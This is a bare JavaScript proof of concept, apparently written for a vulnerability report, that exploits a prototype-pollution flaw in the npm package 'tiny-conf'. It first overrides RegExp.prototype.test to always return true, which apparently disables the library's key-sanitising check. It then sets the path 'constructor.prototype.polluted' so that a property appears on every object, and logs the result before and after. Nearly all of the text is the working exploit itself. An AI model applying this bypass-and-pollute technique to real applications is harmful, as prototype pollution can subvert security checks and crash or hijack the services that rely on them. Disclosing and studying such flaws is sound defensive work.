RegExp.prototype.test = () => true;
const tinyConf = require('tiny-conf');
obj = {};
console.log({}.polluted);
tinyConf.set('constructor.prototype.polluted', 'yes');
console.log({}.polluted);